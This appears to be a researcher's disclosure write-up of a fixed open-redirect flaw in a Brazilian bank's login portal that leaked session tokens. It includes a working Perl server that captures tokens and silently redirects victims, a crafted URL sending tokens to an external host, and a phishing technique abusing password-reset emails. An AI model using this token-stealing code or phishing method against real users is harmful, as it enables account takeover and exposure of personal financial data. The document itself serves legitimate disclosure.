---
layout: content
title: 'From an Open Redirect in a Brazilian Bank to Session Token Leak'
description: 'Through an open redirect on the financial institution website it was possible leak the users session token and realize an account takeover'
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---


Table of contents:
- [Summary](#summary)
- [Description](#description)
- [Proof of Concept](#proof-of-concept)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [References](#references)

---

### Summary

This publication aims to share an Open Redirect vulnerability[1] discovered on the Caixa Econômica Federal website, through which it was possible to expose user Session Tokens.

It should be clarified that throughout all testing, only one accountt—authorised by the account holder—was used. No other user accounts or information were accessed or compromised during the development of this research and proof of concept.

Timeline:

```plaintext
01/01/2020: Vulnerability discovered and proof of concept created;
01/05/2020: Vulnerability reported;
01/07/2020: Vulnerability confirmed by Caixa Econômica Federal;
01/10/2020: Vulnerability fixed;
01/10/2020: Technical article published;
```

* This publication is also available in: [Spanish](/2020/01/03/Obteniendo-un-Session-Token-Leak) and [Portuguese](/2020/01/03/Conseguindo-Session-Token-Leak-com-Open-Redirect);

---

### Description

While navigating the Caixa Federal's web pages, an authentication screen was identified, requesting for access credentials such as CPF (similar to a Social Security Number), NIS, email, and a password. The page in question is the login screen for accessing the Portal Cidadão dashboard.

![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)

The relevant URL was:
- [http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()

URL—&redirect_uri=—presents a potential Open Redirect vulnerability. This parameter defines the URL to which the user will be redirected after completing the login process.

To validate this, the value of the &redirect_uri= parameter was changed to the Google homepage. After entering valid credentials and logging in, the following result was obtained:

- <iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

As shown, the application is vulnerable to Open Redirect. Furthermore, another detail was observed: during redirection, an additional parameter was sent, as seen in the URL:

- [https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

Upon analysis, it was confirmed that the ?code= parameter corresponds to a Session Token[[2]](#references).

This makes the vulnerability of high severity. An attacker could redirect users to a malicious under their control and capture the Session Token, granting them access to the user's account and compromising the confidentiality and integrity of their data.

---

### Proof Of Concept

To demonstrate the possibility of token leakage and capture, the following code was used:

```perl
#!/usr/bin/env perl
# perl catcher.pl daemon -m production -l http://\*:8080

use 5.030;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
    $catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

    my $code = $catcher -> param("code");

    open (my $logs, ">>", "catcher.logs");
    print $logs "[+] - New Session Token -> '$code' has been catch.\n";
    close ($logs);

    return ($catcher -> render (
        text => "<script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code'</script>"
    ));

};

app -> start();
```

This code captures and stores Session Tokens sent to a "malicious" URL controlled by the attacker. In addition to logging the Session Token, the script redirects the user back to the legitimate Caixa Federal site, ensuring they receive a valid session. This makes it unlikely the user will realize they've been deceived. The proof-of-concept URL is structured as follows:

- [https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)

The result can be observed in the following recording:

- <iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

The attack surface in this scenario is still limited as the user must be tricked into accessing the malicious URL (e.g. via phishing or social engineering).

Additionally, it was discovered that the &redirect_uri= parameter is also used in password reset emails. When a user requests a password reset via the "Register/Forgot my password" option, the link included in the email reflects the value provided in this parameter. By submitting a victim’s email or CPF, a password reset link containing a malicious redirect can be sent.

A sample email generated using this method appears as follows:

![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)

This email is sent from an official Caixa Federal system. However, the embedded link is "infected" with the attacker's redirect. Once the user completes the password reset process, Session Token is still leaked via the redirect.

An attacker could use this technique to send phishing emails disguised as legitimate password reset requests from Caixa Econômica Federal, increasing the credibility of the malicious link. This attack can be scaled easily, requiring only the victim's CPF.

---

### Impact

If successfully exploited, this vulnerability would allow an attacker to view confidential user information, including:

![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Full Name, CPF (Social Security Number), Last Access Date & Time

![Caixa Federal Confidential Data FGTS](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

- Full Name, PIS Number, Contracting Company, Work Card Number, FGTS Account, Admission Date, Total Account Balance and also the amount deposited each month during the period worked at the Company

![Caixa Federal Confidential User Andress](/images/publications/caixa-account-takeover/confidential-user-andress.png)

- User's full address (editable without requiring a password)

---

### Conclusion

An attacker could exploit the vulnerabilities described above to breach the confidentiality of legitimate Caixa Econômica Federal users.

It was recommended that Caixa Econômica Federal investigate whether these vulnerabilities were actively being exploited by malicious actors for fraudulent purposes.

---

### References

- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)
